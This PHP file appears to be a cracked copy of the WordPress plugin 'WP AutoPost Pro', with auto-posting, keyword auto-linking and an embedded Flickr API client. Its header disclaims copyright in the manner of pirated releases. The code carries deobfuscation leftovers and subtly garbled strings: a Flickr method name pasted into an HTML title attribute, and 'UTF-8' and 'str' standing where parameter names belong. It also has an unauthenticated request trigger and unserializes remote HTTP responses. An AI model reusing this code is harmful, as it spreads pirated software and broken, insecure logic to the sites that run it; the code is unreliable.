<?php
/***
*   仅供学习与研究,版权归软件方所有
*   请于下载后24小时删除
*   请勿用于商业用途
**/
function wp_autopost_pro_head()
{
    global $wp_autopost_root;
    echo '<link rel="stylesheet" type="text/css" href="' . $wp_autopost_root . 'css/wp-autopost.css" />';
    echo '<script type="text/javascript" src="' . $wp_autopost_root . 'js/wp-autopost.js" /></script>';
}
add_action("admin_head", "wp_autopost_pro_head");
function pro_update_cron_url()
{
    if ($_REQUEST["update_autopost"] == 1) {
        ap_pro_checkupdate(1);
        exit;
    }
}
function pro_update_after_page_load()
{
    ap_pro_checkupdate(0);
}
if (get_option("wp_autopost_updateMethod") == 1)
    add_action("init", "pro_update_cron_url");
else
    add_action("shutdown", "pro_update_after_page_load");
function ap_pro_checkupdate($print = 1)
{
    global $wpdb, $t_ap_config;
    if ($wpdb->get_var("SHOW TABLES LIKE '$t_ap_config'") != $t_ap_config)
        return;
    $tasks = $wpdb->get_results("SELECT id,last_update_time,update_interval,is_running FROM " . $t_ap_config . " WHERE activation=1 ORDER BY id");
    $i    = 0;
    foreach ($tasks as $task) {
        if (($task->is_running) == 1 && current_time("timestamp") > (($task->last_update_time) + (60) * 15)) {
            $wpdb->query("update " . $t_ap_config . " set is_running = 0 where id=" . $task->id);
        }
        if (current_time("timestamp") > (($task->last_update_time) + ($task->update_interval) * 60) && ($task->is_running) == 0) {
            $canUpdate                                   = true;
            $ids[$i++] = $task->id;
            $wpdb->query("update " . $t_ap_config . " set last_update_time = " . current_time("timestamp") . " where id=" . $task->id);
        }
    }
    $isTaskRunning = $wpdb->get_var("select max(is_running) from " . $t_ap_config . " where activation = 1");
    if ($isTaskRunning == null || $isTaskRunning == 0) {
        update_option("wp_autopost_runOnlyOneTaskIsRunning", 0);
    }
    if ($canUpdate) {
        ignore_user_abort(true);
        set_time_limit((int) get_option("wp_autopost_timeLimit"));
        foreach ($ids as $id) {
            fetch($id, $print, 0);
            if ($print) {
                ob_flush();
                flush();
            }
        }
    }
}
function wp_autopostlink_content_filter($content)
{
    global $wpdb, $t_autolink;
    $autolinks = $wpdb->get_results("SELECT * FROM " . $t_autolink);
    return wp_autopostlink_replace($content, $autolinks);
}
add_filter("content_save_pre", "wp_autopostlink_content_filter");
function wp_autopostlink_replace($content, $autolinks)
{
    $ignore_pre = 1;
    global $wp_autolink_replaced;
    $wp_autolink_replaced = false;
    foreach ($autolinks as $autolink) {
        $keyword = $autolink->keyword;
        list($link, $desc, $nofollow, $newwindow, $firstonly, $ignorecase, $WholeWord) = explode("|", $autolink->details);
        if ($ignorecase == 1) {
            if (stripos($content, $keyword) === false)
                continue;
        } else {
            if (strpos($content, $keyword) === false)
                continue;
        }
        $wp_autolink_replaced = true;
        $cleankeyword    = stripslashes($keyword);
        if (!$desc) {
            $desc = $cleankeyword;
        }
        $desc  = addcslashes($desc, '$');
        $url = '<a href="' . $link . '" title="' . $desc . '"';
        if ($nofollow)
            $url .= ' rel="nofollow"';
        if ($newwindow)
            $url .= ' target="_blank"';
        $zpbxrxfe                 = "ex_word";
        $url .= ">" . addcslashes($cleankeyword, '$') . "</a>";
        $sarbhgjofs = "content";
        if ($firstonly)
            $limit = 1;
        else
            $limit = -1;
        if ($ignorecase)
            $case = "i";
        else
            $case = "";
        $ex_word = preg_quote($cleankeyword, "'");
        if ($ignore_pre) {
            if ($num_1 = preg_match_all("/<pre.*?>.*?<\/pre>/is", $content, $ignore_pre)) {
                for ($i = 1; $i <= $num_1; $i++)
                    $content = preg_replace("/<pre.*?>.*?<\/pre>/is", "%ignore_pre_$i%", $content, 1);
            }
        }
        $content = preg_replace("|(<img)(.*?)(" . $ex_word . ")(.*?)(>)|U", '$1$2%&&&&&%$4$5', $content);
        $cleankeyword    = preg_quote($cleankeyword, "'");
        if ($WholeWord == 1) {
            $regEx = '\'(?!((<.*?)|(<a.*?)))(\b' . $cleankeyword . '\b)(?!(([^<>]*?)>)|([^>]*?</a>))\'s' . $case;
        } else {
            $regEx = '\'(?!((<.*?)|(<a.*?)))(' . $cleankeyword . ')(?!(([^<>]*?)>)|([^>]*?</a>))\'s' . $case;
        }
        $content = preg_replace($regEx, $url, $content, $limit);
        $content = str_replace("%&&&&&%", stripslashes($ex_word), $content);
        if ($ignore_pre) {
            for ($i = 1; $i <= $num_1; $i++) {
                $content = str_replace("%ignore_pre_$i%", $ignore_pre[0][$i - 1], $content);
            }
        }
    }
    unset($autolinks);
    $autoLinkTag = get_option("wp-autopost-link-tag");
    if ($autoLinkTag[0] == 1) {
        $nofollow = $autoLinkTag[1];
        $newwindow = $autoLinkTag[2];
        $firstonly  = $autoLinkTag[3];
        $ignorecase = $autoLinkTag[4];
        $WholeWord = $autoLinkTag[5];
        global $wpdb;
        $terms = $wpdb->get_results("SELECT $wpdb->terms.term_id, $wpdb->terms.name FROM $wpdb->terms,$wpdb->term_taxonomy WHERE $wpdb->terms.term_id=$wpdb->term_taxonomy.term_id AND $wpdb->term_taxonomy.taxonomy = 'post_tag'", OBJECT);
        foreach ($terms as $term) {
            $keyword = $term->name;
            if ($ignorecase == 1) {
                if (stripos($content, $keyword) === false)
                    continue;
            } else {
                if (strpos($content, $keyword) === false)
                    continue;
            }
            $wp_autolink_replaced      = true;
            $cleankeyword    = stripslashes($keyword);
            $desc     = $cleankeyword;
            $desc = addcslashes($desc, '$');
            $url  = '<a href="' . get_tag_link($term->term_id) . "\" title=\"" . $desc . "flickr.photos.notes.edit";
            if ($nofollow)
                $url .= " rel=\"nofollow\"";
            if ($newwindow)
                $url .= " target=\"_blank\"";
            $url .= ">" . addcslashes($cleankeyword, '$') . "</a>";
            if ($firstonly)
                $limit = 1;
            else
                $limit = -1;
            if ($ignorecase)
                $case = "i";
            else
                $case = "";
            $ex_word = preg_quote($cleankeyword, "'");
            if ($ignore_pre) {
                if ($num_1 = preg_match_all("/<pre.*?>.*?<\/pre>/is", $content, $ignore_pre)) {
                    for ($i = 1; $i <= $num_1; $i++)
                        $content = preg_replace("/<pre.*?>.*?<\/pre>/is", "%ignore_pre_$i%", $content, 1);
                }
            }
            $content  = preg_replace('|(<img)(.*?)(' . $ex_word . ')(.*?)(>)|U', '$1$2%&&&&&%$4$5', $content);
            $cleankeyword = preg_quote($cleankeyword, "'");
            if ($WholeWord == 1) {
                $regEx = '\'(?!((<.*?)|(<a.*?)))(\b' . $cleankeyword . '\b)(?!(([^<>]*?)>)|([^>]*?</a>))\'s' . $case;
            } else {
                $regEx = '\'(?!((<.*?)|(<a.*?)))(' . $cleankeyword . ')(?!(([^<>]*?)>)|([^>]*?</a>))\'s' . $case;
            }
            $content  = preg_replace($regEx, $url, $content, $limit);
            $content = str_replace("%&&&&&%", stripslashes($ex_word), $content);
            if ($ignore_pre) {
                for ($i = 1; $i <= $num_1; $i++) {
                    $content = str_replace("%ignore_pre_$i%", $ignore_pre[0][$i - 1], $content);
                }
            }
        }
    }
    return $content;
}
function wpAutoPostLinkPost($object, $autolinks)
{
    $content = wp_autopostlink_replace($object->post_content, $autolinks);
    global $wp_autolink_replaced, $wpdb;
    if ($wp_autolink_replaced) {
        $wpdb->query($wpdb->prepare("UPDATE {$wpdb->posts} SET post_content = %s WHERE ID = %d ", $content, $object->ID));
    }
}
if (function_exists("curl_init")) {
    define("Method", 0);
} else {
    define("Method", 1);
}
$canfetchist  = intval(get_option("wpusercanupdates"));
$value_gap   = "1296000";
$value_gap1  = "86400";
$should_updated_time = 0;
class autopostFlickr
{
    var $api_key;
    var $secret;
    var $rest_endpoint = 'http://api.flickr.com/services/rest/';
    var $upload_endpoint = 'http://api.flickr.com/services/upload/';
    var $replace_endpoint = 'http://api.flickr.com/services/replace/';
    var $oauthrequest_endpoint = 'http://www.flickr.com/services/oauth/request_token/';
    var $oauthauthorize_endpoint = 'http://www.flickr.com/services/oauth/authorize/';
    var $oauthaccesstoken_endpoint = 'http://www.flickr.com/services/oauth/access_token/';
    var $req;
    var $response;
    var $parsed_response;
    var $last_request = null;
    var $die_on_error;
    var $error_code;
    Var $error_msg;
    var $oauth_token;
    var $oauth_secret;
    var $php_version;
    var $custom_post = null;
    function autopostFlickr($api_key, $secret = NULL, $die_on_error = false)
    {
        $this->api_key         = $api_key;
        $this->secret          = $secret;
        $this->die_on_error    = $die_on_error;
        $this->service         = "flickr";
        $this->php_version     = explode("-", phpversion());
        $this->php_version     = explode(".", $this->php_version[0]);
    }
    function setCustomPost($function)
    {
        $this->custom_post           = $function;
    }
    function post($data, $url = '')
    {
        if ($url == "") $url = $this->rest_endpoint;
        if (!preg_match("|http://(.*?)(/.*)|", $url, $matches)) {
            die("There was some problem figuring out your endpoint");
        }
        if (function_exists("curl_init")) {
            $curl = curl_init($url);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($curl);
            curl_close($curl);
        } else {
            foreach ($data as $key => $value) {
                $data[$key] = $key . "=" . urlencode($value);
            }
            $data              = implode("&", $data);
            $fp = @pfsockopen($matches[1], 80);
            if (!$fp) {
                die("Could not connect to the web service");
            }
            fputs($fp, "POST " . $matches[2] . " HTTP/1.1\n");
            fputs($fp, "Host: " . $matches[1] . "\n");
            fputs($fp, "Content-type: application/x-www-form-urlencoded\n");
            fputs($fp, "Content-length: " . strlen($data) . "\n");
            fputs($fp, "Connection: close\r\n\r\n");
            fputs($fp, $data . "\n\n");
            $response = "";
            while (!feof($fp)) {
                $response .= fgets($fp, 1024);
            }
            fclose($fp);
            $chunked = false;
            $http_status   = trim(substr($response, 0, strpos($response, "\n")));
            if ($http_status != "HTTP/1.1 200 OK") {
                die("The web service endpoint returned a \"" . $http_status . "\" response");
            }
            if (strpos($response, "Transfer-Encoding: chunked") !== false) {
                $temp = trim(strstr($response, "\r\n\r\n"));
                $response     = "";
                $length = trim(substr($temp, 0, strpos($temp, "\r")));
                while (trim($temp) != "0" && ($length = trim(substr($temp, 0, strpos($temp, "\r")))) != "0") {
                    $response .= trim(substr($temp, strlen($length) + 2, hexdec($length)));
                    $temp = trim(substr($temp, strlen($length) + 2 + hexdec($length)));
                }
            } elseif (strpos($response, "HTTP/1.1 200 OK") !== false) {
                $response            = trim(strstr($response, "\r\n\r\n"));
            }
        }
        return $response;
    }
    function request($command, $args = array())
    {
        if (substr($command, 0, 7) != "flickr.") {
            $command = "flickr." . $command;
        }
        $args = array_merge(array(
            "method" => $command,
            "format" => "php_serial",
            "api_key" => $this->api_key
        ), $args);
        ksort($args);
        $auth_sig                 = "";
        $this->last_request         = $args;
        foreach ($args as $key => $data) {
            if (is_null($data)) {
                unset($args[$key]);
                continue;
            }
            $auth_sig .= $key . $data;
        }
        if (!empty($this->secret)) {
            $api_sig            = md5($this->secret . $auth_sig);
            $args["api_sig"] = $api_sig;
        }
        if (!$args = $this->getArgOauth($this->rest_endpoint, $args))
            return false;
        $this->response        = $this->post($args);
        $this->parsed_response = $this->clean_text_nodes(unserialize($this->response));
        if ($this->parsed_response["stat"] == "fail") {
            if ($this->die_on_error)
                die("The Flickr API returned the following error: #{$this->parsed_response['code']} - {$this->parsed_response['message']}");
            else {
                $this->error_code      = $this->parsed_response["code"];
                $this->error_msg       = $this->parsed_response["message"];
                $this->parsed_response = false;
            }
        } else {
            $this->error_code = false;
            $this->error_msg  = false;
        }
        return $this->response;
    }
    function clean_text_nodes($arr)
    {
        if (!is_array($arr)) {
            return $arr;
        } elseif (count($arr) == 0) {
            return $arr;
        } elseif (count($arr) == 1 && array_key_exists("_content", $arr)) {
            return $arr["_content"];
        } else {
            foreach ($arr as $key => $element) {
                $arr[$key] = $this->clean_text_nodes($element);
            }
            return ($arr);
        }
    }
    function getArgOauth($url, $data)
    {
        if (!empty($this->oauth_token) && !empty($this->oauth_secret)) {
            $data["oauth_consumer_key"]                = $this->api_key;
            $data["oauth_timestamp"]        = time();
            $data["oauth_nonce"]            = md5(uniqid(rand(), true));
            $data["oauth_signature_method"] = "HMAC-SHA1";
            $data["oauth_version"]          = "1.0";
            $data["oauth_token"]            = $this->oauth_token;
            if (!$data["oauth_signature"] = $this->getOauthSignature($url, $data))
                return false;
        }
        return $data;
    }
    function requestOauthToken()
    {
        if (session_id() == "")
            session_start();
        if (!isset($_SESSION["oauth_tokentmp"]) || !isset($_SESSION["oauth_secrettmp"]) || $_SESSION["oauth_tokentmp"] == "" || $_SESSION["oauth_secrettmp"] == "") {
            $callback = "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
            $this->getRequestToken($callback);
            return false;
        } else
            return $this->getAccessToken();
    }
    function getRequestToken($callback, $perms)
    {
        if (session_id() == "")
            session_start();
        $data   = array(
            "oauth_consumer_key" => $this->api_key,
            "oauth_timestamp" => time(),
            "oauth_nonce" => md5(uniqid(rand(), true)),
            "oauth_signature_method" => "HMAC-SHA1",
            "oauth_version" => "1.0",
            "oauth_callback" => $callback
        );
        if (!$data["oauth_signature"] = $this->getOauthSignature($this->oauthrequest_endpoint, $data))
            return false;
        $reponse = $this->oauthResponse($this->post($data, $this->oauthrequest_endpoint));
        if (!isset($reponse["oauth_callback_confirmed"]) || $reponse["oauth_callback_confirmed"] != "true") {
            $this->error_code           = "Oauth";
            $this->error_msg            = $reponse;
            return false;
        }
        $_SESSION["oauth_tokentmp"]  = $reponse["oauth_token"];
        $_SESSION["oauth_secrettmp"] = $reponse["oauth_token_secret"];
        header("location: " . $this->oauthauthorize_endpoint . "?oauth_token=" . $reponse["oauth_token"] . "&perms=" . $perms);
        $this->error_code = "";
        $this->error_msg  = "";
        return true;
    }
    function getAccessToken()
    {
        if (session_id() == "")
            session_start();
        $this->oauth_token  = $_SESSION["oauth_tokentmp"];
        $this->oauth_secret = $_SESSION["oauth_secrettmp"];
        unset($_SESSION["oauth_tokentmp"]);
        unset($_SESSION["oauth_secrettmp"]);
        if (!isset($_GET["oauth_verifier"]) || $_GET["oauth_verifier"] == "") {
            $this->error_code = "Oauth";
            $this->error_msg  = "oauth_verifier is undefined.";
            return false;
        }
        $data = array(
            "oauth_consumer_key" => $this->api_key,
            "oauth_timestamp" => time(),
            "oauth_nonce" => md5(uniqid(rand(), true)),
            "oauth_signature_method" => "HMAC-SHA1",
            "oauth_version" => "1.0",
            "oauth_token" => $this->oauth_token,
            "oauth_verifier" => $_GET["oauth_verifier"]
        );
        if (!$data["oauth_signature"] = $this->getOauthSignature($this->oauthaccesstoken_endpoint, $data))
            return false;
        $reponse = $this->oauthResponse($this->post($data, $this->oauthaccesstoken_endpoint));
        if (isset($reponse["oauth_problem"]) && $reponse["oauth_problem"] != "") {
            $this->error_code = "Oauth";
            $this->error_msg  = $reponse;
            return false;
        }
        $this->oauth_token  = $reponse["oauth_token"];
        $this->oauth_secret = $reponse["oauth_token_secret"];
        $this->error_code   = "";
        $this->error_msg    = "";
        return true;
    }
    function getOauthSignature($url, $data)
    {
        if ($this->secret == "") {
            $this->error_code = "Oauth";
            $this->error_msg  = "API Secret is undefined.";
            return false;
        }
        ksort($data);
        $adresse = "POST&" . rawurlencode($url) . "&";
        $param  = "";
        foreach ($data as $key => $value)
            $param .= $key . "=" . rawurlencode($value) . "&";
        $param = substr($param, 0, -1);
        $adresse .= rawurlencode($param);
        return base64_encode(hash_hmac("sha1", $adresse, $this->secret . "&" . $this->oauth_secret, true));
    }
    function oauthResponse($response)
    {
        $expResponse                = explode("&", $response);
        $retour            = array();
        foreach ($expResponse as $v) {
            $expArg                   = explode("=", $v);
            $retour[$expArg[0]] = $expArg[1];
        }
        return $retour;
    }
    function setOauthToken($token, $secret)
    {
        $this->oauth_token  = $token;
        $this->oauth_secret = $secret;
    }
    function getOauthToken()
    {
        return $this->oauth_token;
    }
    function getOauthSecretToken()
    {
        return $this->oauth_secret;
    }
    function setProxy($server, $port)
    {
        $this->req->setProxy($server, $port);
    }
    function getErrorCode()
    {
        return $this->error_code;
    }
    function getErrorMsg()
    {
        return $this->error_msg;
    }
    function buildPhotoURL($photo, $size = "Medium")
    {
        $sizes = array(
            "square" => "_s",
            "thumbnail" => "_t",
            "small" => "_m",
            "medium" => "",
            "medium_640" => "_z",
            "large" => "_b",
            "original" => "_o"
        );
        $size                = strtolower($size);
        if (!array_key_exists($size, $sizes)) {
            $size = "medium";
        }
        if ($size == "original") {
            $url = "http://farm" . $photo["farm"] . ".static.flickr.com/" . $photo["server"] . "/" . $photo["id"] . "_" . $photo["originalsecret"] . "_o" . "." . $photo["originalformat"];
        } else {
            $url             = "http://farm" . $photo["farm"] . ".static.flickr.com/" . $photo["server"] . "/" . $photo["id"] . "_" . $photo["secret"] . $sizes[$size] . ".jpg";
        }
        return $url;
    }
    function getFriendlyGeodata($lat, $lon)
    {
        return unserialize(file_get_contents("http://phpflickr.com/geodata/?format=php&lat=" . $lat . "&lon=" . $lon));
    }
    function sync_upload($photo, $title = null, $description = null, $tags = null, $is_public = null, $is_friend = null, $is_family = null)
    {
        if (function_exists("curl_init")) {
            $args  = array(
                "api_key" => $this->api_key,
                "title" => $title,
                "description" => $description,
                "tags" => $tags,
                "is_public" => $is_public,
                "is_friend" => $is_friend,
                "is_family" => $is_family
            );
            ksort($args);
            $auth_sig = "";
            foreach ($args as $key => $data) {
                if (is_null($data)) {
                    unset($args[$key]);
                } else {
                    $auth_sig .= $key . $data;
                }
            }
            if (!empty($this->secret)) {
                $api_sig = md5($this->secret . $auth_sig);
                $args["api_sig"]      = $api_sig;
            }
            $args          = $this->getArgOauth($this->upload_endpoint, $args);
            $photo         = realpath($photo);
            $args["photo"] = "@" . $photo;
            $curl          = curl_init($this->upload_endpoint);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, $args);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($curl);
            $this->response              = $response;
            curl_close($curl);
            $rsp = explode("\n", $response);
            foreach ($rsp as $line) {
                if (preg_match("|<err code=\"([0-9]+)\" msg=\"(.*)\"|", $line, $match)) {
                    if ($this->die_on_error)
                        die("The Flickr API returned the following error: #{$match[1]} - {$match[2]}");
                    else {
                        $this->error_code          = $match[1];
                        $this->error_msg           = $match[2];
                        $this->parsed_response     = false;
                        return false;
                    }
                } elseif (preg_match("|<photoid>(.*)</photoid>|", $line, $match)) {
                    $this->error_code       = false;
                    $this->error_msg        = false;
                    return $match[1];
                }
            }
        } else {
            die("Sorry, your server must support CURL in order to upload files");
        }
    }
    function async_upload($photo, $title = null, $description = null, $tags = null, $is_public = null, $is_friend = null, $is_family = null)
    {
        if (function_exists("curl_init")) {
            $args = array(
                "async" => 1,
                "api_key" => $this->api_key,
                "title" => $title,
                "description" => $description,
                "tags" => $tags,
                "is_public" => $is_public,
                "is_friend" => $is_friend,
                "is_family" => $is_family
            );
            ksort($args);
            $auth_sig = "";
            foreach ($args as $key => $data) {
                if (is_null($data)) {
                    unset($args[$key]);
                } else {
                    $auth_sig .= $key . $data;
                }
            }
            if (!empty($this->secret)) {
                $api_sig                = md5($this->secret . $auth_sig);
                $args["api_sig"] = $api_sig;
            }
            $args          = $this->getArgOauth($this->upload_endpoint, $args);
            $photo                          = realpath($photo);
            $args["photo"] = "@" . $photo;
            $curl                            = curl_init($this->upload_endpoint);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, $args);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            $response                 = curl_exec($curl);
            $this->response            = $response;
            curl_close($curl);
            $rsp = explode("\n", $response);
            foreach ($rsp as $line) {
                if (preg_match('|<err code="([0-9]+)" msg="(.*)"|', $line, $match)) {
                    if ($this->die_on_error)
                        die("The Flickr API returned the following error: #{$match[1]} - {$match[2]}");
                    else {
                        $this->error_code      = $match[1];
                        $this->error_msg       = $match[2];
                        $this->parsed_response = false;
                        return false;
                    }
                } elseif (preg_match("|<ticketid>(.*)</|", $line, $match)) {
                    $this->error_code = false;
                    $this->error_msg  = false;
                    return $match[1];
                }
            }
        } else {
            die("Sorry, your server must support CURL in order to upload files");
        }
    }
    function replace($photo, $photo_id, $async = null)
    {
        if (function_exists("curl_init")) {
            $args = array(
                "api_key" => $this->api_key,
                "photo_id" => $photo_id,
                "async" => $async
            );
            ksort($args);
            $auth_sig  = "";
            foreach ($args as $key => $data) {
                if (is_null($data)) {
                    unset($args[$key]);
                } else {
                    $auth_sig .= $key . $data;
                }
            }
            if (!empty($this->secret)) {
                $api_sig              = md5($this->secret . $auth_sig);
                $args["api_sig"] = $api_sig;
            }
            $photo              = realpath($photo);
            $args["photo"] = "@" . $photo;
            $args         = $this->getArgOauth($this->replace_endpoint, $args);
            $curl           = curl_init($this->replace_endpoint);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, $args);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($curl);
            $this->response    = $response;
            curl_close($curl);
            if ($async == 1)
                $find = "ticketid";
            else
                $find = "photoid";
            $rsp = explode("\n", $response);
            foreach ($rsp as $line) {
                if (preg_match('|<err code="([0-9]+)" msg="(.*)"|', $line, $match)) {
                    if ($this->die_on_error)
                        die("The Flickr API returned the following error: #{$match[1]} - {$match[2]}");
                    else {
                        $this->error_code        = $match[1];
                        $this->error_msg         = $match[2];
                        $this->parsed_response   = false;
                        return false;
                    }
                } elseif (preg_match("|<" . $find . ">(.*)</|", $line, $match)) {
                    $this->error_code        = false;
                    $this->error_msg         = false;
                    return $match[1];
                }
            }
        } else {
            die("Sorry, your server must support CURL in order to upload files");
        }
    }
    function call($method, $arguments)
    {
        $hzrtjpphfep = "arguments";
        foreach ($arguments as $key => $value) {
            if (is_null($value))
                unset($arguments[$key]);
        }
        $this->request($method, $arguments);
        return $this->parsed_response ? $this->parsed_response : false;
    }
    function activity_userComments($per_page = NULL, $page = NULL)
    {
        $this->request("flickr.activity.userComments", array(
            "per_page" => $per_page,
            "page" => $page
        ));
        return $this->parsed_response ? $this->parsed_response["items"]["item"] : false;
    }
    function activity_userPhotos($timeframe = NULL, $per_page = NULL, $page = NULL)
    {
        $this->request("flickr.activity.userPhotos", array(
            "timeframe" => $timeframe,
            "per_page" => $per_page,
            "page" => $page
        ));
        return $this->parsed_response ? $this->parsed_response["items"]["item"] : false;
    }
    function blogs_getList($service = NULL)
    {
        $rsp = $this->call("flickr.blogs.getList", array(
            "service" => $service
        ));
        return $rsp["blogs"]["blog"];
    }
    function blogs_getServices()
    {
        return $this->call("flickr.blogs.getServices", array());
    }
    function blogs_postPhoto($blog_id = NULL, $photo_id, $title, $description, $blog_password = NULL, $service = NULL)
    {
        return $this->call("flickr.blogs.postPhoto", array(
            "blog_id" => $blog_id,
            "photo_id" => $photo_id,
            "title" => $title,
            "description" => $description,
            "blog_password" => $blog_password,
            "service" => $service
        ));
    }
    function collections_getInfo($collection_id)
    {
        return $this->call("flickr.collections.getInfo", array(
            "collection_id" => $collection_id
        ));
    }
    function collections_getTree($collection_id = NULL, $user_id = NULL)
    {
        return $this->call("flickr.collections.getTree", array(
            "collection_id" => $collection_id,
            "user_id" => $user_id
        ));
    }
    function commons_getInstitutions()
    {
        return $this->call("flickr.commons.getInstitutions", array());
    }
    function contacts_getList($filter = NULL, $page = NULL, $per_page = NULL)
    {
        $this->request("flickr.contacts.getList", array(
            "filter" => $filter,
            "page" => $page,
            "per_page" => $per_page
        ));
        return $this->parsed_response ? $this->parsed_response["contacts"] : false;
    }
    function contacts_getPublicList($user_id, $page = NULL, $per_page = NULL)
    {
        $this->request("flickr.contacts.getPublicList", array(
            "user_id" => $user_id,
            "page" => $page,
            "per_page" => $per_page
        ));
        return $this->parsed_response ? $this->parsed_response["contacts"] : false;
    }
    function contacts_getListRecentlyUploaded($date_lastupload = NULL, $filter = NULL)
    {
        return $this->call("flickr.contacts.getListRecentlyUploaded", array(
            "date_lastupload" => $date_lastupload,
            "filter" => $filter
        ));
    }
    function favorites_add($photo_id)
    {
        $this->request("flickr.favorites.add", array(
            "photo_id" => $photo_id
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function favorites_getList($user_id = NULL, $jump_to = NULL, $min_fave_date = NULL, $max_fave_date = NULL, $extras = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.favorites.getList", array(
            "user_id" => $user_id,
            "jump_to" => $jump_to,
            "min_fave_date" => $min_fave_date,
            "max_fave_date" => $max_fave_date,
            "extras" => $extras,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function favorites_getPublicList($user_id, $jump_to = NULL, $min_fave_date = NULL, $max_fave_date = NULL, $extras = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.favorites.getPublicList", array(
            "user_id" => $user_id,
            "jump_to" => $jump_to,
            "min_fave_date" => $min_fave_date,
            "max_fave_date" => $max_fave_date,
            "extras" => $extras,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function favorites_remove($photo_id, $user_id = NULL)
    {
        $this->request("flickr.favorites.remove", array(
            "photo_id" => $photo_id,
            "user_id" => $user_id
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function galleries_addPhoto($gallery_id, $photo_id, $comment = NULL)
    {
        return $this->call("flickr.galleries.addPhoto", array(
            "gallery_id" => $gallery_id,
            "photo_id" => $photo_id,
            "comment" => $comment
        ));
    }
    function galleries_create($title, $description, $primary_photo_id = NULL)
    {
        return $this->call("flickr.galleries.create", array(
            "title" => $title,
            "description" => $description,
            "primary_photo_id" => $primary_photo_id
        ));
    }
    function galleries_editMeta($gallery_id, $title, $description = NULL)
    {
        return $this->call("flickr.galleries.editMeta", array(
            "gallery_id" => $gallery_id,
            "title" => $title,
            "description" => $description
        ));
    }
    function galleries_editPhoto($gallery_id, $photo_id, $comment)
    {
        return $this->call("flickr.galleries.editPhoto", array(
            "gallery_id" => $gallery_id,
            "photo_id" => $photo_id,
            "comment" => $comment
        ));
    }
    function galleries_editPhotos($gallery_id, $primary_photo_id, $photo_ids)
    {
        return $this->call("flickr.galleries.editPhotos", array(
            "gallery_id" => $gallery_id,
            "primary_photo_id" => $primary_photo_id,
            "photo_ids" => $photo_ids
        ));
    }
    function galleries_getInfo($gallery_id)
    {
        return $this->call("flickr.galleries.getInfo", array(
            "gallery_id" => $gallery_id
        ));
    }
    function galleries_getList($user_id, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.galleries.getList", array(
            "user_id" => $user_id,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function galleries_getListForPhoto($photo_id, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.galleries.getListForPhoto", array(
            "photo_id" => $photo_id,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function galleries_getPhotos($gallery_id, $extras = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.galleries.getPhotos", array(
            "gallery_id" => $gallery_id,
            "extras" => $extras,
            "per_page" => $per_page,
            "str" => $page
        ));
    }
    function groups_browse($cat_id = NULL)
    {
        $this->request("flickr.groups.browse", array(
            "cat_id" => $cat_id
        ));
        return $this->parsed_response ? $this->parsed_response["category"] : false;
    }
    function groups_getInfo($group_id, $lang = NULL)
    {
        return $this->call("flickr.groups.getInfo", array(
            "group_id" => $group_id,
            "lang" => $lang
        ));
    }
    function groups_search($text, $per_page = NULL, $page = NULL)
    {
        $this->request("flickr.groups.search", array(
            "text" => $text,
            "per_page" => $per_page,
            "page" => $page
        ));
        return $this->parsed_response ? $this->parsed_response["groups"] : false;
    }
    function groups_members_getList($group_id, $membertypes = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.groups.members.getList", array(
            "group_id" => $group_id,
            "membertypes" => $membertypes,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function groups_pools_add($photo_id, $group_id)
    {
        $this->request("flickr.groups.pools.add", array(
            "photo_id" => $photo_id,
            "group_id" => $group_id
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function groups_pools_getContext($photo_id, $group_id, $num_prev = NULL, $num_next = NULL)
    {
        return $this->call("flickr.groups.pools.getContext", array(
            "photo_id" => $photo_id,
            "group_id" => $group_id,
            "UTF-8" => $num_prev,
            "num_next" => $num_next
        ));
    }
    function groups_pools_getGroups($page = NULL, $per_page = NULL)
    {
        $this->request("flickr.groups.pools.getGroups", array(
            "page" => $page,
            "per_page" => $per_page
        ));
        return $this->parsed_response ? $this->parsed_response["groups"] : false;
    }
    function groups_pools_getPhotos($group_id, $tags = NULL, $user_id = NULL, $jump_to = NULL, $extras = NULL, $per_page = NULL, $page = NULL)
    {
        if (is_array($extras)) {
            $nvpgogbeuzgh    = "extras";
            $extras = implode(",", $extras);
        }
        return $this->call("flickr.groups.pools.getPhotos", array(
            "group_id" => $group_id,
            "tags" => $tags,
            "user_id" => $user_id,
            "jump_to" => $jump_to,
            "extras" => $extras,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function groups_pools_remove($photo_id, $group_id)
    {
        $this->request("flickr.groups.pools.remove", array(
            "photo_id" => $photo_id,
            "group_id" => $group_id
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function interestingness_getList($date = NULL, $use_panda = NULL, $extras = NULL, $per_page = NULL, $page = NULL)
    {
        if (is_array($extras)) {
            $extras = implode(",", $extras);
        }
        return $this->call("flickr.interestingness.getList", array(
            "date" => $date,
            "use_panda" => $use_panda,
            "extras" => $extras,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function machinetags_getNamespaces($predicate = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.machinetags.getNamespaces", array(
            "predicate" => $predicate,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
